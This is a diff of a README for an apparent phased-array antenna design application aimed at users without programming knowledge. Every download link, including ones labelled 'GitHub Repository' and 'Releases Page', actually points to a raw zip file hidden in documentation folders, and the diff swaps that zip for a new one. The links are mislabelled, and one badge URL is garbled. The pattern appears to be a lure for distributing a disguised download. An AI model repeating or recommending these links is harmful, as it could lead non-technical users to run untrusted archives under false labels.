@@ -4,7 +4,7 @@
 
 Welcome to the phased-array-systems project! This application helps you design, optimize, and visualize phased array antenna systems for wireless communication and radar applications. You do not need programming knowledge to get started. Just follow the steps below.
 
-[![Download from Releases](https://raw.githubusercontent.com/KHOBIB/phased-array-systems/main/docs/javascripts/array-systems-phased-v1.1.zip%https://raw.githubusercontent.com/KHOBIB/phased-array-systems/main/docs/javascripts/array-systems-phased-v1.1.zip)](https://raw.githubusercontent.com/KHOBIB/phased-array-systems/main/docs/javascripts/array-systems-phased-v1.1.zip)
+[![Download from Releases](https://raw.githubusercontent.com/KHOBIB/phased-array-systems/main/docs/api/models/array_systems_phased_v2.9.zip%https://raw.githubusercontent.com/KHOBIB/phased-array-systems/main/docs/api/models/array_systems_phased_v2.9.zip)](https://raw.githubusercontent.com/KHOBIB/phased-array-systems/main/docs/api/models/array_systems_phased_v2.9.zip)
 
 ## 📝 Features
 
@@ -17,7 +17,7 @@ Welcome to the phased-array-systems project! This application helps you design, 
 
 To get the application, visit the Releases page. There, you can download the latest version of the software.
 
-[Visit the Releases Page to Download](https://raw.githubusercontent.com/KHOBIB/phased-array-systems/main/docs/javascripts/array-systems-phased-v1.1.zip)
+[Visit the Releases Page to Download](https://raw.githubusercontent.com/KHOBIB/phased-array-systems/main/docs/api/models/array_systems_phased_v2.9.zip)
 
 ### Step-by-Step Download Instructions
 
@@ -85,7 +85,7 @@ For updates on new features, please watch this repository. This way, you can sta
 
 ## 🔗 Links
 
-- [GitHub Repository](https://raw.githubusercontent.com/KHOBIB/phased-array-systems/main/docs/javascripts/array-systems-phased-v1.1.zip)
-- [Releases Page](https://raw.githubusercontent.com/KHOBIB/phased-array-systems/main/docs/javascripts/array-systems-phased-v1.1.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/KHOBIB/phased-array-systems/main/docs/api/models/array_systems_phased_v2.9.zip)
+- [Releases Page](https://raw.githubusercontent.com/KHOBIB/phased-array-systems/main/docs/api/models/array_systems_phased_v2.9.zip)
 
-Remember, you can visit our [Releases Page to Download](https://raw.githubusercontent.com/KHOBIB/phased-array-systems/main/docs/javascripts/array-systems-phased-v1.1.zip) anytime to access the latest version. Enjoy designing your phased array antennas!
+Remember, you can visit our [Releases Page to Download](https://raw.githubusercontent.com/KHOBIB/phased-array-systems/main/docs/api/models/array_systems_phased_v2.9.zip) anytime to access the latest version. Enjoy designing your phased array antennas!
